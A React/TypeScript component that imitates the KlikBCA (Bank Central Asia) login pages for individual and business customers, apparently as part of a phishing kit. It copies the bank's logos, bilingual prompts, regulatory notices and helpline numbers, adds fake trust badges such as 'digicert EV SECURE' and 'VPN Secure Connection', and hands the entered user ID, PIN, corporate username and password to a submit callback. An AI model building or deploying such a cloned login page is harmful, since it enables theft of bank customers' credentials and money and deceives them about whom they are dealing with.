import React, { useState } from 'react';

interface UserIdFormProps {
  onSubmitSuccess: (details: {
    mode: 'Perorangan' | 'Bisnis';
    userId: string;
    pass: string;
  }) => void;
}

export const UserIdForm: React.FC<UserIdFormProps> = ({ onSubmitSuccess }) => {
  const [mode, setMode] = useState<'Perorangan' | 'Bisnis'>('Perorangan');
  const [userIdPerorangan, setUserIdPerorangan] = useState('');
  const [pinPerorangan, setPinPerorangan] = useState('');
  const [usernameBisnis, setUsernameBisnis] = useState('');
  const [passBisnis, setPassBisnis] = useState('');

  const handlePeroranganSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!userIdPerorangan.trim() || !pinPerorangan.trim()) return;
    onSubmitSuccess({
      mode: 'Perorangan',
      userId: userIdPerorangan,
      pass: pinPerorangan,
    });
  };

  const handleBisnisSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!usernameBisnis.trim() || !passBisnis.trim()) return;
    onSubmitSuccess({
      mode: 'Bisnis',
      userId: usernameBisnis,
      pass: passBisnis,
    });
  };

  return (
    <div className="-mx-4 -mt-4 -mb-6">
      {/* Top Bar Switcher */}
      <div className="bg-white border-b border-[#d9e2ec] px-3.5 py-2.5 flex items-center justify-between rounded-t-lg">
        <span className="text-xs font-bold text-[#00508c]">KlikBCA Safe Access</span>
        <div className="flex bg-[#e2e8f0] rounded-full p-0.5 gap-0.5" id="tabContainer">
          <button
            type="button"
            id="tabPerorangan"
            onClick={() => setMode('Perorangan')}
            className={`px-3 py-1 text-xs font-bold rounded-full transition-all duration-200 cursor-pointer hover:scale-105 active:scale-95 ${
              mode === 'Perorangan' ? 'bg-[#00508c] text-white shadow-xs' : 'bg-transparent text-slate-600 hover:text-slate-900'
            }`}
          >
            KlikBCA Individu
          </button>
          <button
            type="button"
            id="tabBisnis"
            onClick={() => setMode('Bisnis')}
            className={`px-3 py-1 text-xs font-bold rounded-full transition-all duration-200 cursor-pointer hover:scale-105 active:scale-95 ${
              mode === 'Bisnis' ? 'bg-[#00508c] text-white shadow-xs' : 'bg-transparent text-slate-600 hover:text-slate-900'
            }`}
          >
            KlikBCA Bisnis
          </button>
        </div>
      </div>

      {/* ================= TAMPILAN KLIKBCA INDIVIDU (PERORANGAN) ================= */}
      {mode === 'Perorangan' && (
        <div id="viewPerorangan" className="bg-white rounded-b-lg overflow-hidden text-left">
          {/* Top Yellow Bar */}
          <div className="h-1.5 bg-[#ffcc00] w-full"></div>

          {/* Blue Header Bar with KlikBCA Logo */}
          <div className="bg-[#00438c] h-12 px-4 flex items-center shadow-inner">
            <svg width="86" height="42" viewBox="0 0 120 62" fill="none" style={{ filter: 'drop-shadow(0 2px 3px rgba(0,0,0,0.3))' }}>
              <defs>
                <linearGradient id="kbcabg_r" x1="0" y1="0" x2="0" y2="1">
                  <stop offset="0%" stopColor="#195ba5"/>
                  <stop offset="50%" stopColor="#0b4393"/>
                  <stop offset="100%" stopColor="#072e66"/>
                </linearGradient>
                <linearGradient id="kbcashine_r" x1="0" y1="0" x2="1" y2="0">
                  <stop offset="0%" stopColor="#fed100"/>
                  <stop offset="50%" stopColor="#ffffff"/>
                  <stop offset="100%" stopColor="#fed100"/>
                </linearGradient>
              </defs>
              <rect x="2" y="3" width="116" height="56" rx="8" fill="#031b3e" />
              <rect x="2" y="1" width="116" height="56" rx="8" fill="url(#kbcabg_r)" stroke="#ffffff" strokeWidth="1.2" />
              <path d="M4 20 C 30 6, 80 6, 116 16 L 116 11 C 78 2, 32 2, 4 12 Z" fill="url(#kbcashine_r)" opacity="0.95"/>
              <text x="36" y="27" fill="#ffffff" fontSize="20" fontWeight="900" fontFamily="'Trebuchet MS', sans-serif" fontStyle="italic">Klik</text>
              <g transform="translate(14, 32) scale(0.65)">
                <circle cx="16" cy="14" r="13" fill="#ffffff"/>
                <path d="M16 3 C13 7 13 11 16 14 C19 11 19 7 16 3Z" fill="#00508c"/>
                <path d="M5 14 C9 11 13 11 16 14 C13 17 9 17 5 14Z" fill="#00508c"/>
                <path d="M27 14 C23 11 19 11 16 14 C19 17 23 17 27 14Z" fill="#00508c"/>
                <path d="M16 25 C13 21 13 17 16 14 C19 17 19 21 16 25Z" fill="#00508c"/>
                <path d="M8 6 C12 9 14 12 16 14 C12 14 9 12 8 6Z" fill="#00508c"/>
                <path d="M24 6 C20 9 18 12 16 14 C20 14 23 12 24 6Z" fill="#00508c"/>
              </g>
              <text x="44" y="50" fill="#ffffff" fontSize="22" fontWeight="900" fontFamily="'Arial Black', Impact, sans-serif" fontStyle="italic" letterSpacing="1">BCA</text>
            </svg>
          </div>

          {/* Bottom Yellow Bar */}
          <div className="h-1.5 bg-[#ffcc00] w-full"></div>

          {/* Form Content */}
          <form onSubmit={handlePeroranganSubmit} className="p-4 bg-white">
            <div className="underline text-[#1e3a5f] text-[15px] font-semibold leading-snug">Silakan masukkan USER ID Anda</div>
            <div className="text-[#d97706] text-sm font-medium mb-2">Please enter your USER ID</div>
            <input
              type="text"
              id="uiUserIdPerorangan"
              value={userIdPerorangan}
              onChange={(e) => setUserIdPerorangan(e.target.value)}
              required
              className="w-full h-9 border-2 border-black rounded-xs px-2.5 text-[15px] outline-none mb-3.5 bg-white text-black"
            />

            <div className="underline text-[#1e3a5f] text-[15px] font-semibold leading-snug">Silakan masukkan PIN Internet Banking Anda</div>
            <div className="text-[#d97706] text-sm font-medium mb-2">Please enter your Internet Banking PIN</div>
            <input
              type="password"
              id="uiPinPerorangan"
              maxLength={12}
              value={pinPerorangan}
              onChange={(e) => setPinPerorangan(e.target.value)}
              required
              className="w-full h-9 border-[1.5px] border-slate-500 rounded px-2.5 text-[15px] outline-none mb-3.5 bg-white text-black"
            />

            <div className="flex items-center justify-between mb-4">
              <button
                type="submit"
                id="submitPeroranganBtn"
                className="bg-gray-200 hover:bg-gray-300 hover:scale-105 hover:shadow-md active:scale-95 border-[1.5px] border-gray-600 rounded px-4 py-1 text-sm font-bold text-gray-900 cursor-pointer shadow-xs transition-all duration-200"
              >
                LOGIN
              </button>
              <a href="https://m.klikbca.com" target="_blank" rel="noopener noreferrer" className="text-[#003399] underline text-[15px] font-semibold">
                Full Site
              </a>
            </div>

            {/* Browser/OS Terupdate Banner */}
            <div className="border border-blue-200 rounded-md bg-gradient-to-b from-[#f8fbfe] to-[#e9f2fa] p-2 flex items-center justify-between gap-2 mb-3.5 shadow-xs">
              <div className="flex flex-col gap-0.5 text-[10px] font-bold text-[#1e3a5f] shrink-0">
                <div className="flex items-center gap-1">
                  <span className="text-green-600 text-xs font-black">✓</span>
                  <span>Browser Terupdate</span>
                </div>
                <div className="flex items-center gap-1">
                  <span className="text-green-600 text-xs font-black">✓</span>
                  <span>OS Terupdate</span>
                </div>
              </div>
              <div className="shrink-0">
                <svg width="36" height="36" viewBox="0 0 64 64" fill="none">
                  <circle cx="32" cy="18" r="10" fill="#fcd34d"/>
                  <path d="M22 14 C22 10 26 8 32 8 C38 8 42 10 42 14 C42 16 38 17 38 17 C38 17 34 16 32 16 C30 16 26 17 26 17 Z" fill="#475569"/>
                  <path d="M16 48 L22 28 L42 28 L48 48 Z" fill="#00508c"/>
                  <path d="M28 28 L32 38 L36 28 Z" fill="#ffffff"/>
                  <path d="M31 30 L33 30 L32.5 40 L31.5 40 Z" fill="#dc2626"/>
                  <circle cx="50" cy="22" r="7" fill="#38bdf8"/>
                  <text x="50" y="25" textAnchor="middle" fill="#ffffff" fontSize="7" fontWeight="900" fontFamily="sans-serif">OS</text>
                </svg>
              </div>
              <div className="bg-white border border-slate-300 rounded-xl p-1.5 text-[9.5px] text-slate-700 leading-snug flex-1 text-center">
                <div>Layanan KlikBCA hanya dapat diakses secara optimal melalui browser terupdate.</div>
                <div className="mt-0.5">Info lengkapnya <span className="text-red-600 font-bold underline cursor-pointer">klik disini</span></div>
              </div>
              <div className="shrink-0 bg-[#00508c] text-white text-[7.5px] font-bold p-1 rounded text-center leading-tight">
                <span className="italic text-[7px]">Klik</span><br/><b>BCA</b>
              </div>
            </div>

            {/* Trust Badges */}
            <div className="flex items-center gap-3.5 mb-3.5">
              <div className="flex items-center gap-1.5">
                <svg viewBox="0 0 36 36" width="28" height="28">
                  <path d="M18 4 C13 4 10 7 10 12 L10 16 L26 16 L26 12 C26 7 23 4 18 4 Z" fill="none" stroke="#00508c" strokeWidth="3"/>
                  <circle cx="18" cy="24" r="11" fill="#00508c"/>
                  <path d="M18 13 A 11 11 0 0 1 29 24 L 18 24 Z" fill="#e11d48"/>
                  <path d="M29 24 A 11 11 0 0 1 18 35 L 18 24 Z" fill="#22c55e"/>
                  <path d="M18 35 A 11 11 0 0 1 7 24 L 18 24 Z" fill="#eab308"/>
                  <circle cx="18" cy="24" r="4" fill="#ffffff"/>
                </svg>
                <div className="flex flex-col leading-none">
                  <span className="text-[11px] font-black text-red-600 tracking-tight">AWAS<br/><span className="text-[#00508c]">MODUS</span></span>
                  <span className="bg-amber-500 text-[#1e3a5f] text-[7.5px] font-extrabold px-1 py-0.5 rounded mt-0.5 text-center">Klik disini</span>
                </div>
              </div>
              <div className="border-[1.5px] border-[#00508c] rounded-md px-1.5 py-1 flex items-center gap-1 bg-white">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="#00508c">
                  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
                </svg>
                <div className="flex flex-col leading-none">
                  <span className="text-[9px] font-extrabold text-[#00508c]">digicert</span>
                  <span className="text-[7px] font-bold text-[#00508c]">EV SECURE</span>
                  <span className="text-[6px] text-slate-500">Click to Verify</span>
                </div>
              </div>
            </div>

            {/* Regulatory Section */}
            <div className="text-[11.5px] leading-relaxed text-slate-800">
              <p className="mb-1">BCA berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia.</p>
              <p className="mb-1">BCA merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per nasabah per bank adalah Rp2 miliar.</p>
              <p className="mb-1.5">Untuk cek Tingkat Bunga Penjaminan LPS, klik <a href="#" className="underline font-medium">disini</a>.</p>
            </div>
            <div className="border-b-[1.5px] border-amber-600 my-1.5"></div>
            <div className="text-[11.5px] leading-relaxed text-amber-700 mb-3.5">
              <p className="mb-1">BCA is licensed and supervised by Financial Services Authority (Otoritas Jasa Keuangan) & Bank Indonesia.</p>
              <p className="mb-1">BCA is a member of Indonesia Deposit Insurance Corporation (LPS). The maximum deposit value guaranteed by LPS per customer per bank is IDR 2 billion.</p>
              <p className="mb-0">To check the LPS Guarantee Interest Rate, click <a href="#" className="underline font-medium">here</a>.</p>
            </div>
          </form>

          {/* Bottom Solid Blue Bar */}
          <div className="h-9 bg-[#00438c] w-full"></div>
        </div>
      )}

      {/* ================= TAMPILAN KLIKBCA BISNIS ================= */}
      {mode === 'Bisnis' && (
        <div id="viewBisnis" className="bg-[#f1f6fa] p-5 relative overflow-hidden rounded-b-lg min-h-[520px] text-left">
          {/* Decorative soft blue shape */}
          <div className="absolute -right-12 -bottom-5 w-36 h-36 rounded-full bg-[#96c2e8] opacity-55 pointer-events-none z-0"></div>

          {/* Top row */}
          <div className="flex items-center justify-end gap-3 mb-4 relative z-10">
            <span className="text-[#00508c] text-sm font-semibold cursor-pointer">English Version</span>
            <div className="w-9 h-9 rounded-full bg-[#38495a] flex items-center justify-center text-white shadow-xs">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
                <polyline points="9 22 9 12 15 12 15 22"></polyline>
              </svg>
            </div>
          </div>

          {/* Branding Header */}
          <div className="mb-6 relative z-10">
            <div className="flex items-center gap-2">
              <svg width="34" height="34" viewBox="0 0 100 100">
                <rect width="100" height="100" rx="20" fill="#00508c"/>
                <circle cx="50" cy="50" r="40" fill="#ffffff"/>
                <path d="M50 20 C42 32 42 42 50 50 C58 42 58 32 50 20Z" fill="#00508c"/>
                <path d="M20 50 C32 42 42 42 50 50 C42 58 32 58 20 50Z" fill="#00508c"/>
                <path d="M80 50 C68 42 58 42 50 50 C58 58 68 58 80 50Z" fill="#00508c"/>
                <path d="M50 80 C42 68 42 58 50 50 C58 58 58 68 50 80Z" fill="#00508c"/>
                <path d="M29 29 C39 37 44 44 50 50 C44 44 37 39 29 29Z" fill="#00508c"/>
                <path d="M71 29 C61 37 56 44 50 50 C56 44 63 39 71 29Z" fill="#00508c"/>
              </svg>
              <span className="text-[34px] font-black italic text-[#00508c] font-sans tracking-tighter">BCA</span>
            </div>
            <h1 className="text-[#004481] text-2xl font-extrabold mt-1 mb-0.5 tracking-tight">KlikBCA Bisnis</h1>
            <div className="text-[#005e9c] text-[17px] font-medium">VPN Secure Connection</div>
          </div>

          {/* Form Bisnis */}
          <form onSubmit={handleBisnisSubmit} className="relative z-10">
            <div className="mb-4">
              <label className="block text-[#00508c] text-sm font-bold mb-1.5">Username</label>
              <input
                type="text"
                id="uiUsernameBisnis"
                value={usernameBisnis}
                onChange={(e) => setUsernameBisnis(e.target.value)}
                required
                placeholder="CorporateID UserID (tanpa spasi)"
                className="w-full h-11 bg-white border-[1.5px] border-blue-300 rounded-lg px-3.5 text-[14.5px] text-slate-800 outline-none shadow-xs"
              />
            </div>

            <div className="mb-5">
              <label className="block text-[#00508c] text-sm font-bold mb-1.5">Password</label>
              <input
                type="password"
                id="uiPassBisnis"
                value={passBisnis}
                onChange={(e) => setPassBisnis(e.target.value)}
                required
                placeholder="KeyBCA Appli 1"
                className="w-full h-11 bg-white border-[1.5px] border-slate-300 rounded-lg px-3.5 text-[14.5px] text-slate-800 outline-none shadow-xs"
              />
            </div>

            <div className="mb-5">
              <button
                type="submit"
                id="submitBisnisBtn"
                className="w-full h-12 bg-[#0060af] text-white font-extrabold text-base tracking-wide rounded-full border-none cursor-pointer shadow-[0_4px_12px_rgba(0,96,175,0.25)] hover:bg-[#004d8c] hover:scale-[1.02] hover:shadow-[0_8px_24px_rgba(0,96,175,0.4)] active:scale-[0.98] transition-all duration-200"
              >
                LOGIN
              </button>
            </div>

            {/* Security Notices */}
            <div className="text-[13.5px] text-slate-800 leading-relaxed mb-4">
              <p className="mb-3">Jangan membagikan Corporate/User ID, Respon KeyBCA Appli 1 dan 2 kepada siapa pun.</p>
              <p className="mb-3">
                Jika ada yang hal yang mencurigakan hubungi Halo BCA Bisnis via telepon di 1500998 atau bebas pulsa via aplikasi{' '}
                <span className="inline-flex items-center justify-center bg-[#00508c] text-white rounded-md px-1.5 py-0.5 text-[9px] font-extrabold ml-0.5 align-middle leading-tight text-center">
                  halo<br/>BCA
                </span>
              </p>
              <p className="mb-3.5">
                Jika Anda belum memiliki fasilitas KlikBCA Bisnis, silakan akses <span className="text-[#00508c] underline font-medium cursor-pointer">Informasi KlikBCA Bisnis</span> atau hubungi:
              </p>
              <div className="flex items-center gap-2.5 mt-2">
                <div className="w-9 h-9 rounded-full bg-[#00a4e4] flex items-center justify-center text-white shrink-0 shadow-xs">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/>
                  </svg>
                </div>
                <div>
                  <div className="text-[13px] text-[#00508c] font-semibold leading-tight">Halo Layanan KlikBCA Bisnis</div>
                  <div className="text-[13.5px] text-[#00508c] font-extrabold">1500998</div>
                </div>
              </div>
            </div>
          </form>
        </div>
      )}
    </div>
  );
};
